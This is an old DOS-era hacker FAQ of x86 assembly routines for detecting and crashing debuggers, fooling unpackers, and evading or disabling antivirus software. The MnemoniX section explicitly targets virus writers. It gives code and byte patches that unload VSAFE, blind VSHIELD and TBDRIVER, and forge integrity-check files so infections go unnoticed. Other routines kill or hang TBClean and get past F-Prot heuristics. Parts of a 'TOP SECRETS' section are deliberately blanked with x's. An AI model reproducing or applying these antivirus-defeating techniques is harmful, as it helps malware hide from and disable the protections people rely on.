# Insider - Faq, Edition #1 Uncomplete

```
««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««
»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»
			      
			      INSIDER - FAQ           
			  Edition #1 Uncomplete
			   by Christoph Gabler

««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««
»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»
──────                                                                  ──────
───                                                                        ───

   ───────────────┐
   │ Introduction │ 
   └─────────────── 


  The INSIDER - FAQ is a very helpfull assembly based document that includes 
  source codes from many good coders. I've taken them from other magazines
  or programs around. You will find only WORKING (I've tested them all!)
  ASM code. Every line is commented by the author or by myself.
  If you want the uncovered TOP SECRETS! section you must register TRAP
  to get the complete version of this FAQ. I hope you'll find something
  usefull (especially my own Anti-AV routine is nice).

  These section can be found in the INSIDER - FAQ :

   ──────────────────┐    ┌──────────────────────    ────────────────────────┐
   │ Anti Trace Code │    │ Anti-AntiVirus Code │    │ How to fool unpackers │
   └──────────────────    ──────────────────────┘    └────────────────────────
			      ────────────────   
			      │ TOP SECRETS! │   
			      ────────────────   


  -> If you have coded your own anti-trace/debug routine please send it to
     me and it will be added here! 

Legend:  »»   =  The two arrows mean that the following text is a comment
		 by myself.

	 ¡!   =  This means that the following source code is very usefull.
```			
---
```asm
   ──────────────────┐
   │ Anti Trace Code │
   └──────────────────

 ╓═════════════════════════╖
 ║    Vector cut (Int1)    ║
 ║    by Piotr Warezak (C) ║
 ╚═════════════════════════╝    

»»
The following code shows how to stop most realmode Debugger/Tracer
like IUP,Debug,Xtract...
»»

	push ds                         ;save DS register
	xor ax,ax                       ;zero DS register
	mov ds,ax
	not word ptr ds:[0005]          ;cut off INT1 vector for a moment
	jmp short j1
	db 09ah
j1:     not word ptr ds:[0005]          ;restore INT1 vector
	pop ds                          ;restore DS register
```
---
```asm
 ╓═════════════════════════╖
 ║     Overlap Code        ║
 ║     by Dark Angel       ║
 ╚═════════════════════════╝    

»»
It (should) stops: Debug,Turbo Debug,Realmode Debug...
»»

	mov     ax,0FE05h
	jmp     $-2h            ; Let's jump a command back.
	add     ah,03Bh

»»
¡!
Now Dark Angel has put in a invisible HLT to the code. A bit noughtier as 
just looping, isn't?
It kills: Debug,Turbo Debug,Sourcer,Realmode Debug,Iceunp (sometimes :)...
»»

	mov     cx,09EBh
	mov     ax,0FE05h ; -\
	jmp     $-2       ;   >-> I think you should know this allready!?
	add     ah,03Bh   ; -/
	jmp     $-10

```			
---
```asm
 ╓═════════════════════════╖
 ║     Anti-Debug Code     ║
 ║     by Dale Curtis      ║
 ╚═════════════════════════╝    
»»
Another way to stop the 3 most common Debuggers. They were too taken from
ROSE's RADFAQ. Thanx!
It stops: Debug,Turbo Debug,Realmode Debug...
»»

	   eat_debug:
	    push    cs
	    pop     ds
	    mov     dx,offset eat_int
	    mov     ax,2501h
	    int     21h
	    mov     al,03h
	    int     21h
			   ; Place the rest of your code here!
	   eat_int:
	    iret           ; or whatever. EXPERIMENT!!!


»»
Here is my favourite way to send most 8086-mode debuggers to hell.
It stops: Debug,Turbo Debug,Realmode Debug...
»»


PUSH    AX
POP     AX
DEC     SP
DEC     SP
POP     BX               ; BX should point to the pushed AX.
CMP     AX,BX
JNE     CODE_IS_TRACED   ; He! He! Found a victim to kill!

jmp REST_OF_CODE
CODE_IS_TRACED:
DB 0CDh,90h              ; I love INT 90h !!! =8)
JMP $-0                  ; Just to make sure that nobody climbs out. =8)
REST_OF_CODE:            ; No Debugger found, keep goin'...


»»
And here is a INT3 fuckup routine. It also stops most realmode tracers.
It stops: IUP,Debug,Turbo Debug,Realmode Debug...
»»

	      MOV    CX,0264     
	      MOV    SI,0110
	doit: LODSB
	      INT    3
	      CBW
	      ADD    BX,AX
	      LOOP   doit
```			
---
```asm
 ╓═════════════════════════╖
 ║ Multi Stop Code         ║
 ║ Disasm by Rose (?)      ║
 ╚═════════════════════════╝    

»»
A stack crash routine found in RADFAQ. It stops Debuggers,Tracers,Anti-AV
progs like TBClean. Be carrefull too, it may hang sometimes somewhere.
Test it.
It stops: TBClean,IUP,Debug,Turbo Debug,Realmode Debug,Sourcer...
»»

		CLI
		STI
		MOV    AX,SS
		MOV    BX,SP
		PUSH   CS
		POP    SS
		MOV    SP,010B 
		NOP
		NOP
		JMP    FuckStack
		NOP
		NOP
     FuckStack: MOV    SP,BX
		MOV    SS,AX
    
```			
---
```asm
 ╓═════════════════════════╖
 ║ Int replacement         ║
 ║ by Inbar Raz (C)        ║
 ╚═════════════════════════╝    

»»
This routine can be found in many protectors.   
Stops:Debug,Realmode...
»»
    

		CLI
		XOR    AX,AX
		MOV    ES,AX
		MOV    AX,ES:[0084]
		MOV    ES:[0004],AX
		MOV    AX,ES:[0086]
		MOV    ES:[0006],AX
		MOV    AH,76
		INT    01                
```			
---
```asm
 ╓═════════════════════════╖
 ║ GTR 1.85 Slowdown       ║
 ║ by Christoph Gabler     ║
 ╚═════════════════════════╝    

»»
GTR 1.85 needs about 3 minutes to trace through the following code.
It turns the scroll lock led on and quickly off again.
The GTR user might think that GTR has stopped.
> If you want something better than this shit, if you want source to
DETECT ANY GTR version register TRAP and you'll get the uncovered INSIDER.FAQ
with the routine!
»»

push ds                ; Save DS
xor ax,ax
mov ds,ax        
mov bx,0417
mov byte ptr [bx],16d  ; Turn only scroll lock ON
call ScrollDo
jmp ScrollOFF
ScrollDo:
mov ah,01
int 16h                ; Change keyb func.
ret

ScrollOFF:
mov byte ptr [bx],80   ; Turn the scroll lock OFF
call ScrollDo
pop ds                 ; Restore DS 
```			
---
```asm
 ╓═════════════════════════╖
 ║ WiNiCE recognization    ║
 ║ by ??                   ║
 ╚═════════════════════════╝    

»»
Let's come to the interresting part of stopping Debuggers : Stopping Soft-Ice!
BTW: It stops TBClean too!
Detects: Only WiNiCE Win3.1 NOT the Dos version. (maybe Win95 and NT too!?) 
(not tested by myself)
»»

; Anti SoftIce trick #1
	   mov ax,01684h
	   mov bx,0202h ; VXD ID for Winice, check out Ralf Brown's INTLIST
	   xor di,di
	   mov es,di
	   int 2fh
	   mov ax,es
	   add di,ax
	   cmp di,0
	   jne winice_is_installed
jmp REST_OF_ASM
winice_is_installed:
int 21h
jmp winice_is_installed
REST_OF_ASM:

```			
---
```asm
 ╓═════════════════════════╖
 ║ Cheap IceUnp detection  ║
 ║ by Christoph Gabler     ║
 ╚═════════════════════════╝    

»»
IceUnp uses good trace modes but the coder forgot one really dumb thing :
His program does always use the same temporary file that is created before
the Iceunp traced the file - a very stupid mistake because Iceunp can be
detected while just searching the temp file called '1ICEUNP'
Here is a method how to do it.
> This one is cheap to. Get a REAL IceUnp detection in the UNcovered version
of INSIDER.FAQ !
»»
	
	mov     ah,4e                    ; Find the first match
	lea     dx,[bp+offset ICETEMP]   ; Load the offset filemask dx
	int     21h                      ; Call DOS
	jc      OK                       ; Jump if the file doesn't exist 

	int 20h                          ; Exit to DOS if ICEUNP found.
					 ; Or place a HLT here or whatever.

OK:                                      ; Rest of your code


ICETEMP db '1ICEUNP',0                   ; This must be placed out of range.

```			
---
```
 ╓══════════════════════════════════════╖
 ║ 32 Bit Control- & Debug Register FAQ ║
 ║ By Christoph Gabler (C)              ║
 ╚══════════════════════════════════════╝    
»»
The following section should complain the working and function of
the 32 Bit Control and Debug registers wich can used to detect nearly
ANY 80386 Debugger/GenericUnpacker. This short FAQ should describe
what the CPU and Debugger does when it executes modification on DRx/CRx.
If you know anything more about these registers please write it down
and I'll add it here!
»»

(1) The following 'enhanced' 32 Bit registers exist :
	
   [CRx] Control Registers
   CR0,CR2,CR3
     
   [DRx] Debug Registers
   DR0,DR1,DR2,DR3,DR6,DR7

   [TRx] Test Registers
   TR4,TR5,TR6,TR7

(2) Description/function of the single register :

   CR0  =  Should not be set to a value over ca. 7000h -> CPU/Debug reboots.
	   With CR0 CUP386 /7 can be detected. Iceunp/TR can be kicked with
	   modification.
   CR2  =  Can be modified like wild, but should be restored. TR can be 
							      caught with it.
   CR3  =  ANY modification under EMM386 causes an error -> Press Return to
							    reboot the system.
   DR7  =  Used by many Debuggers. Modification kicks Iceunp.
	   Strange: After running HS 1.13/PCrypt modifications
	   over 2000h halts the CPU. With DR7 CUP386 /3 & GTR can be cought.

   DR0-DR6  =  Not fully tested yet.

   TR4-TR7  =  Any modi. kicks the CPU and anything else too!


(3) The emulation listing of todays most Generic Unpackers :

   CUP386 /3  =  Tracing seems to be the same as GTR uses. Very bad DR7
		 emulation. Traces through LOCK/HLT ?!?
   CUP386 /7  =  Similar to the method Iceunp uses. Very bad CR0 emulation.
		 Traces through LOCK/HLT ?!?
   GTR 1.85+  =  Confusing good emulation, *BUT* Hendrix, DR7 must NOT
		 be ALWAYS = 400 ! And CR0 not = 10/11 !
   IceUnp     =  Much better entry point search method as CUP386 and good
		 emulation *BUT* can be easily defeated with CR0/DR7 
		 modification.
   TR 1.92+   =  Good emulation but with DR2 TR can be easily detected.
                 'MOV E(A)X,DR3' hangs TR 1.92 ?!?
   TR 1.97    =  WOW! VERY bugfree now and even greater emulation.
                 But he forgot one thing - so TRAP is able to
                 bypass it!
   AUP386     =  Very difficult to say because this 'unpacker' is SO
		 full of bugs -> Hangs the most time... But hey! - I could
		 unpack PKLite ! =8)


   TO ALL 80386-MODE UNPACKER WRITERS : If I set DR7 to 1000h write the
					value into EAX and check what came
					out is this absolutely NOT 400 !

```			
---
```
    ┌──────────────────────    
    │ Anti-AntiVirus Code │    
    ──────────────────────┘    
 ```			
---
```asm
 ╓═════════════════════════╖
 ║ Anti F-Prot Heuristic   ║
 ║ By someone at Crypt ??  ║
 ╚═════════════════════════╝    

»»
A very popular routine to avoid F-Prot's Heuristic Analysis. I think it's
a dumb waste of space using it - I have something better - watch at 
TOP SECRETS!. Poor F-Prot, if it can be avoided by just jumping forwards 
a few times. =8)
»»

		call    screw_fprot              ; confusing f-protect's
		call    screw_fprot              ; heuristic scanning
		call    screw_fprot              ; Still effective as of
		call    screw_fprot              ; version 2.10
		call    screw_fprot              ;
		call    screw_fprot              ; [cf] Crypt Newsletter 18
		call    screw_fprot              ; for explanation & 
		call    screw_fprot              ; rationale
		call    screw_fprot              ;
		call    screw_fprot              ;

screw_fprot:
		jmp  $ + 2                 ;  Pseudo-nested calls to confuse
		call screw2                ;  f-protect's heuristic
		call screw2                ;  analysis
		call screw2                ;
		call screw2                ;
		call screw2                ;  These are straight from
		ret                        ;  YB-X.
screw2:                                     
		jmp  $ + 2                  
		call screw3                 
		call screw3                 
		call screw3                 
		call screw3                 
		call screw3                  
		ret                         
screw3:                                     
		jmp  $ + 2                  
		call screw4                 
		call screw4                 
		call screw4                 
		call screw4                 
		call screw4                 
		ret                         
screw4:                                     
		jmp  $ + 2                  
		ret                         

```			
---
```asm
 ╓═════════════════════════╖
 ║ Anti TBClean routine    ║
 ║ By someone at Crypt ??? ║
 ╚═════════════════════════╝    

»»
Here is THE popularest routine to stop TBClean. It is very big in size
but it's not a waste of space. It stops any TBClean version.
You want a tighter code to avoid TBClean? You want a routine that is just 
only 2 lines long? OK! I have one, my own FuCK-TBClean-2lines-routine!
Get it in the TOP SECRETS! section.
»»

look_4_tbclean:
	mov     ax, word ptr ds:[si]
	xor     ax, 0A5F3h
	je      check_it                        ; Jump If It's TBClean
look_again:
	inc     si                              ; Continue Search
	loop    look_4_tbclean
	jmp     not_found                       ; TBClean Not Found

check_it:
	mov     ax, word ptr ds:[si+4]
	xor     ax, 0006h
	jne     look_again
	mov     ax, word ptr ds:[si+10]
	xor     ax, 020Eh
	jne     look_again
	mov     ax, word ptr ds:[si+12]
	xor     ax, 0C700h
	jne     look_again
	mov     ax, word ptr ds:[si+14]
	xor     ax, 406h
	jne     look_again

	mov     bx, word ptr ds:[si+17]         ; Steal REAL Int 1 Offset
	mov     byte ptr ds:[bx+16], 0CFh       ; Replace With IRET

	mov     bx, word ptr ds:[si+27]         ; Steal REAL Int 3 Offset
	mov     byte ptr ds:[bx+16], 0CFh       ; Replece With IRET

	mov     byte ptr cs:[tb_here][bp], 1    ; Set The TB Flag On

	mov     bx, word ptr ds:[si+51h]        ; Get 2nd Segment of
	mov     word ptr cs:[tb_int2][bp], bx   ; Vector Table

	mov     bx, word ptr ds:[si-5]          ; Get Offset of 1st Copy
	mov     word ptr cs:[tb_ints][bp], bx   ; of Vector Table

not_found:
	mov     cx, 9EBh
	mov     ax, 0FE05h
	jmp     $-2
	add     ah, 3Bh                         ; Hlt Instruction (Kills TD)
	jmp     $-10

	mov     ax, 0CA00h                      ; Exit It TBSCANX In Mem
	mov     bx, 'TB'
	int     2Fh

	cmp     al, 0
	je      tbcleanok
	ret

tbcleanok:

```			
---
```
 ╓══════════════════════════════╖
 ║ Patching Memoryresident AVs  ║
 ║ By MnemoniX (C)              ║
 ╚══════════════════════════════╝    

»»
This big section was taken from a MnemoniX Anti-AV magazine.
It 'only' describes how to kill AV progs that are resident in mem.
Use it if you make resident viruses.
»»

PATCHING VSHIELD

	This patch will prevent VSHIELD from detecting any viruses. This
was tested on VSHIELD V106 - an old version - and probably will not work
on every version, but what the hell. There is a portion of the code which
looks like this:
```			

```asm
	80 FC 0E        cmp     ah,0E
	74 06           je      0A1C
	80 FC 4B        cmp     ah,4B
	74 09           je      0A24
```			

```
	To fix this up, you can :
	
	replace the first byte (80) with CB (a RET)
	  
	OR 

	replace the second JZ (74 09) with two NOP's (90 90)

Either way VSHIELD will no longer scan files as they are executed.

How can you get the original host program past VSHIELD, before VSHIELD has
been patched? Just encrypt it or PKLITE it. Simple enough.

		****************************************************
		* VSAFE versions 1 and 2 (Central Point/Microsoft) *
		****************************************************

	While VSAFE 1.0 was conquered a long time ago, not much seems to have
been done to hack VSAFE 2. Making a virus or hacked program VSAFE-resistant
will make it much more viable, since it is a popular AV monitor. The old
tricks that could be played on VSAFE 1 (which was pure crapware) no longer
work like they used to. Here is what I was able to find though a little bit of
investigation ... (BTW, this was tested on MSAV 1.0 and CPAV 2.2. It should
be similar for other versions except where noted.)
	Firstly, as with all versions, one can check for the presence of VSAFE
in memory with the following code:
```			
```asm
			mov     ax,0FA00h
			mov     dx,5945h        ("VS")
			int     16h
```			
```
	If DI = 4559h ("SV"), VSAFE is present. Functions 16/FA03 and 16/FA08
will return constant values whose significance is unbeknownst to me - they
don't seem to be version numbers.
	Next, the old trick which deinstalled VSAFE, which was the same as the
above code except AX = FA01h, won't cut it anymore. Nor will it change the
VSAFE flags anymore when AX = FA02h. Does this mean that the you can no longer
make VSAFE turn the other way? Hardly - there are still ways around it.
(Remember, _no_ program is immune to being duped.) 
	The two functions to deinstall or change VSAFE options are still there,
but now there's a twist: It checks to see which program is running before it
will act. This is a pain to get around, but not impossible. You can find the
name of the current resident program in the DOS environment, which is found
by getting the DOS environment segment (at offset 2Ch in the PSP), finding
the name of the current program (the environment table is at offset 0, then
two zero bytes signal the end of it, and then there's another two bytes, after
which the name of the current program is found) and changing it to
"\VSAFE.EXE".
	Actually, you don't even need to go to all that trouble. You see,
VSAFE doesn't actually check the filename; it just makes a checksum of the
letters in the filename minus extension. I am hesitant to go into the details
of this now; if you want to see how the checksum works examine it yourself.
Suffice it to say that if, before the period in the filename, you insert the
three-byte hex string 5CFF76, VSAFE will think it's being loaded. Do I hear
cries for an example?
```			
```asm
		mov     ax,ds:[2Ch]             ; get environment segment
		mov     es,ax

		xor     di,di                   ; after the table of environ-
		mov     cx,17D0h                ; ment strings, we will find
		xor     al,al                   ; the current program name

find_environ_end:
		repnz   scasb                   ; scan through environment
		cmp     byte ptr es:[di],0      ; end of table?
		jnz     find_environ_end

		add     di,3                    ; address of program name
		mov     al,'.'                  ; find extension
		repnz   scasb                   ; extension found

		mov     si,es:[di - 3]          ; save orig. program name
		mov     es:[di - 3],76FFh       ; modify program name
		mov     bh,es:[di - 4]          ; make VSAFE think it is
		mov     byte ptr es:[di - 4],5Ch ; calling itself

; VSAFE 2 may now be unloaded

		mov     ax,0FA01h               ; unload VSAFE
		mov     dx,5945h
		int     16h

; fix up program name again

		mov     es:[di - 3],si          ; replace orig. program name
		mov     es:[di - 4],bh
```			
```
	Here is a listing of all the VSAFE functions you need to know.

	(All functions called by INT 16h with DX = 5945h)
	  AX = FA00h - Test for VSAFE resident
			DI=4559h on return is res.
	  AX = FA01h - Deinstall VSAFE
	  AX = FA02h - Change VSAFE flag settings
			BL=bits 0-7 represent settings for flags 1-8, resp.
			on return, CL holds previous flag setting
	  AX = FA05h - Turn popup menu on/off
			BL=0 (on) or 1 (off)

	Version 2 checks name of program currently running before executing
	functions FA01, FA02 or FA05.

	Deinstalling VSAFE works well if nothing is loaded after it in
memory. However, this may not be the case, and if other programs are loaded
VSAFE gives an error message. Hence I don't consider this the best way to
deactivate the program. A better way would be to patch up VSAFE as described
below, and upon writing the disk, save the VSAFE flags and switch them all
off, then restore when done. This should keep it quiet.
	If you're too lazy to mess around with that, there's an even easier
way. The flag status byte in VSAFE 2 is located at offset 0F1Dh in the code,
and you can modify it directly upon finding VSAFE's segment (check INT 16h's
segment.) This particular method will only work for version 2.2; the address
is probably different for other versions.
	Moving on, one will find that the old CHKLIST.CPS files have now been
replaced by SMARTCHK.CPS files, which have a different format. (The MSAV 
equivalents of these files are CHKLIST.MS and SMARTCHK.MS, respectively.) Each
record is 60 bytes long, and consists of the following data:

		Data                            Offset  Length
		----------------------------------------------
		ASCIIZ filename                 0       13
		File attributes                 13      1
		File size                       14      4
		File time                       18      2
		File date                       20      2
		First 32 bytes of file          22      32
		Checksum data                   54      4
		Apparently always set to zero.  58      2

	Now, a VSAFE-smart virus could increase its stealthiness by modifying
this data, which isn't as much of a pain as it may sound. It could modify the 
filenames, so VSAFE no longer properly checks the programs. A more ambitious
programmer could look for the filename, change the first few recorded bytes of
the file, change the date, and fix the checksum. But how do we calculate the
checksum, you ask? Good question. The checksum routine in VSAFE 2 is long and
complicated. (In case you were wondering, the VSAFE 1.0 checksum can be
calculated like this:

		DS:SI = offset of first 64 bytes of file
			(or if file is < 64 bytes long, the entire file)
		BX = high word of 32-bit checksum
		DX = low word of 32-bit checksum
		CX = 64 (for loop) or size of file if < 64 bytes
		AH = 0 (for addition)
```			
```asm
	vsafe_checksum:
		lodsb                   ; add first byte
		add     dx,ax
		adc     bx,0
		lodsb                   ; subtract second byte
		sub     dx,ax
		sbb     bx,0
		lodsb                   ; XOR third byte by first checksum
		xor     dl,al           ; byte only
		sub     cx,3
		cmp     cx,2
		ja      vsafe_checksum
```			
```
The finished checksum is in BX:DX.) I haven't figured out the VSAFE 2 checksum
routine yet - it's much more complicated. But you're welcome to look.
	The included UNSAFE.ASM program is a virus, and demonstrates the
manipulation of VSAFE flags and corruption of SMARTCHK.CPS files. As a
demonstration, try setting the write protect flag on, and then infect a few
files. VSAFE will not warn you of the write, because the flags are temporarily
turned off by the virus when it spreads. Examine and learn.

PATCHING VSAFE

When VSAFE 2.2 is installed, it installs a routine onto interrupt 21h which
checks for different DOS calls, as all monitors do. There is a portion of the
interrupt 21 code which looks like this :
```			
```asm
80 FC 4B        cmp     ah,4B           ; this catches the DOS execute program
74 62           jz      0BAF            ; call so VSAFE can do program checks
80 FC 4C        cmp     ah,4C           ; this catches a DOS terminate program
74 33           jz      0B85            ; call so VSAFE can check memory
80 FC 00        cmp     ah,0            ; another terminate program call check
74 15           jz      0B6C
```			
```
	If we set the trap flag, set AH to 99h (or any nonexistent function
call), call interrupt 21 and scan the code with a tracing routine, we will
eventually find this point. Once we do, it's quite simple to eliminate VSAFE
checks when a program begins and ends:
```			
```asm
80 FC 4B        cmp     ah,4B
90              nop                     ; the JZ's have been replaced with two
90              nop                     ; NOP's each ... VSAFE will no longer
80 FC 4C        cmp     ah,4C           ; check programs as they are run,
90              nop                     ; or check memory when a program
90              nop                     ; terminates, because it won't know
80 FC 4C        cmp     ah,0            ; when these things happen anymore.
90              nop
90              nop
```			
```
	(A brief note: A program can also terminate via interrupt 20h, and
VSAFE _will_ check memory if a program terminates this way. This interrupt
is more difficult to tunnel - once the DOS segment is reached, the tunneling
must be stopped - but it is not impossible. A similar patch could be created
to solve the problem.)

			       ***************
			       * Thunderbyte *  
			       ***************

TB MONITORS

	All TB monitors work through TBDRIVER and hook the critical interrupts
21h,13h, and 40h. These same monitors can be defeated by recursive tunneling
if TBDRIVER's ability to detect such tunneling is deactivated, however.


TBDRIVER'S DETECTION OF RECURSIVE TUNNELING

	TBDRIVER is resistant to most recursive tunneling. When an interrupt
21 is called, TBDRIVER checks the status of the trap flag for a recursive
tunneling routine and will display a message if it is found to be set. The
code that does this appears virtually impenetrable, and looks like this:

(This is from TBDRIVER version 6.14; it may be different now but the idea
 is basically the same.)
```			
```asm
		cli                     ; clear interrupts to prevent
		pushf                   ; interference ...
		cld
		push    ax              ; what this, in essence, does is
		push    bx              ; that is saves a value on the stack,
		xchg    ax,bx           ; pops it, decrements the stack ptr.
		pop     ax              ; to point to it again, pops it again,
		dec     sp              ; and if the value changed, an int-
		dec     sp              ; errupt must have occured. Since the
		pop     bx              ; interrupt flag is off, the only
		cmp     ax,bx           ; interrupt this could be is a type 1 -
		pop     bx              ; the trap flag interrupt routine.
		jz      02A1            ; If two values popped are different,
					; it warns the user.
```			
```
PATCHING TBDRIVER

	Now, there is no way to fool this routine. You can't hide the change
to the value on the stack. However, you _can_ scan for this code in your
tunneling routine, and modify it if it is found. You could look, for example,
for the following code in the interrupt 21 routine:
```			
```asm
5C              pop     bx
3B C3           cmp     ax,bx
5B              pop     bx
74 0D           jz      02A1
```			
```
	If we find the string 5C 3B C3 5B 74 0D, we know TBDRIVER is present.
The next step is modifying the code to make it useless.
	The JZ instruction is the test. If AX and BX are equal, then the Z
flag is set, and if the Z flag is set, the code is not being traced as far
as TBDRIVER is concerned. Hence, you want it to act as though the Z flag was
_always_ set. You could do this by changing the instruction to a JMP:
```			
```asm
EB 0D           jmp     02A1
```			
```
	Now you find the original offset of DOS's interrupt 21 with the same
tunneling routine, and call it directly, bypassing all TB utilities.

DISABLING TBSCANX

	Earlier versions of TBSCANX hook INT 2Fh when they load, and install 
the following functions :
```			
```asm
	AX = CA00h      Test for installation (return FF in AL if res.)
			BX = 'TB'  ('tb' on return if resident)
	AX = CA04h      Scan file
			DS:DX = program to be scanned
			(carry set means infected, ES:BX=filename)
```			
```
With a little work and a good debugger, you can trace the code of other AV
monitors and find similar code in the interrupt 21h or 13h routines. If you
know what you're doing, you could create similar patches to the ones above
for these monitors. The same could be done with non-resident virus scanners,
although this is a more difficult job, and not really worth it in my opinion
since most good scanners check themselves and probably won't find any _good_
new virus anyway.

						- MnemoniX
```			
---
```
    ────────────────────────┐
    │ How to fool unpackers │
    └────────────────────────
```
---
```
 ╓═════════════════════════╖
 ║   PKLite fool           ║
 ║   by Christoph Gabler   ║
 ╚═════════════════════════╝    

If you are still using PKLite ShareW. to compress/protect? your files
than this message may sound nice to you : I found a way how to fool the
new PKLite versions. The old ones could be fooled by just overwriting
the header string 'PKlite' in compressed files. The new versions - I think
2.0 or higher are a bit tougher. Here is a good method that even makes
most other unpacker like X-Tract,WWS,InfoExe... unrecognizable :
FOR COM FILES ONLY:

  [1] - First compress the file with PKLite
  [2] - Edit the compressed file with your favourite Hex Editor
  [3] - Place after the first position a NOP (Hex 90) (DO NOT OVERWRITE!)
  [4] - Now go to the 'PKLite' text and delete the first letter 'P'
  [5] - Save it and you are finish!

FOR EXE FILES ONLY:

Very easy too! Run FOOL!.EXE to see how it works...
```			
---
```
 ╓═════════════════════════╖
 ║   DIET fool             ║
 ║   by Christoph Gabler   ║
 ╚═════════════════════════╝    

Diet is also a very common packer and can be removed by itself with the
command '-RA'. If you want that Diet does not recognize Diet packed files 
do the following :
  
  [1] - Edit a Diet packed file
  [2] - Change position 19 into anything you want to
  [3] - That's it!

Cheap isn't? Diet just places a '9D' (hex) to position 19.
If you now execute Diet with '-RA' it checks for the present of the '9D'
But you can also change position 20 in whatever you want because the program
does not execute position 19 and 20.

```			
---
```	      
 ╓════════════════════════════╖
 ║   Intruder (pASCAL) 'fool' ║
 ║   by Christoph Gabler      ║
 ╚════════════════════════════╝    

If you want to make your progs written in TP or BP restistent against
the 'unpacker' Intruder. This ultimative
groovy and fantastic prog is 'bout unfoolable!!! BUT there is a method
- of course VERY difficult, try it ONLY if you have a VERY good knowlegde 
in ASM! You need to change "!#S456789:;" into whatever you want to 
(it won't be executed) and this godlike unpacker called Intruder won't find 
ANYTHING (WOOWIIE! mAN, yOU mUST bE a rEAL hACKER tO dO tHIS!!!!)
```
---
```
			      ────────────────   
			      │ TOP SECRETS! │   
			      ────────────────   
		
The following section includes the greatest sources! But because you did
not register there are 'some' 'xxx' placed here and there...

```			
---
```asm
 ╓══════════════════════════════╖
 ║ Tightest way to kill TBClean ║
 ║ by Christoph Gabler (C)      ║
 ╚══════════════════════════════╝    

»»
xxxx xx xxx easiest and tightest way to stop TBClean. xx xxxx xxxx x xxxxxxx
xxxx xxxxx xxxxx xx xxx. x xxxxxxcexxxr xxx.
»»

xxxxx ; Really a joke, isn't? This is enough to stop TBClean!

»»
This one stops TBClean while using xxx xx xx xxxx xx. xxx xx is normally
used to call/use xxx xxxxxxxx. TBClean thinks the same but...
»»
		
		xxx     xx,xxxxxxx   ; Free xxxx area   
		xxx     xxh          ; Use xxx xx xx xxxx TBClean             

```			
---
```asm
 ╓═══════════════════════════════════════════════╖
 ║ The Best way to halt ANY 8086 Tracer/Debugger ║
 ║ by Christoph Gabler (C)                       ║
 ╚═══════════════════════════════════════════════╝    

»»
Here is THE best method to fuck up ANY 8086 Tracer/Debugger that exists.
Ok, what it finally does IS simple BUT it works.
This routine - again by myself HANGS TBClean. It does not 'only' stop it.
It xxxxxxxx xxx xxxxx xx xxxxxxx xxxxx xx xx.
»»

xxx BX,xx         ; xaxe xx to xx
xxx xx,xx         ; xxxxxxx xx xxxx xxx xxxx xx xx  / Hlts 8086 tracer/debuger
XOR DX,DX
MOV xx,BX         ; xestoxe xx
xxV BX,DX


```			
---
```asm
 ╓═══════════════════════════════╖
 ║ How to mess up some 386 Debug?║
 ║ by Max Maischein              ║
 ╚═══════════════════════════════╝    
»»
Here is a great xxxxxxxxxxxxxxxxxxxx stop almost any 80386 Debugger/Tracer 
like CUP386,Tracer,Soft-Ice (all versions)
»»
			.386p
			xxx   xxX,xxx
			xx    EAX,xx00h
			MOV   xxx,EAX

			xxV   xxx,xxx
			TxSx  eax,xxx00h
			JZ   OK               ; Jump if no 386 Debugger
						found.

	    DEBUG_FOUND: JMP DEBUG_FOUND      ; Let's loop!

	    OK:                               ; Rest of your code.

```			
---
```asm
 ╓═══════════════════════════════╖
 ║ Universal 80386 Rebooter      ║
 ║ by Christoph Gabler (C)       ║
 ╚═══════════════════════════════╝    
»»
This is THE routine to kill almost any 80386 Tracer/Debugger expect
newer versions of CUP386. It let's TR,Winice,SoftIce,Iceunp... reboot the
system.
»»

.386p         ; Activate 32 Bit registers
MOV EAX,xxx9

MOV EDX,xxx   ; xxxx xx0 to EDX 
MOV xxx,ExX   ; xoxruxx xxx

XOR EAX,EAX   ; Clear some regs (not important)
MOV EBX,EAX
MOV xxx,ExX   ; xestoxe xxx
MOV EDX,EBX   ; Clear the rest of the 32b regs...
MOV ECX,EDX
.8086         ; Just for compatibilty 
```			
---
```
[ A word to those who want to get rid of this wellknown asskicking unpacker
  called CUP386 (especially the /3 switch) : Use DR7, save it, fill it with
  a number higher as 6000, and finally restore it.
  Be carrefull : Some progs do not like this routine and reboot/halt the CPU!
  Better try the following : Did you know that CUP386 /3 always
  restore DR7=400 after it traces code that modifies DR7... Now you should
  be able to create a routines by yourself... (TRAP uses the same method) ]

	   -------------------------------------------------------
  -------- AND MUCH MORE INTERESTING AND WORKING TOP SECRET SOURCE --------
	   -------------------------------------------------------

The INSIDER.FAQ will be updated very soon. Watch out - or better register
TRAP to get the newest uncovered version! 
							    
  -> If you have coded your own anti-trace/debug routine please send it to
     me and it will be added here! 
							    
							    Christoph Gabler
»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»
»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»
```
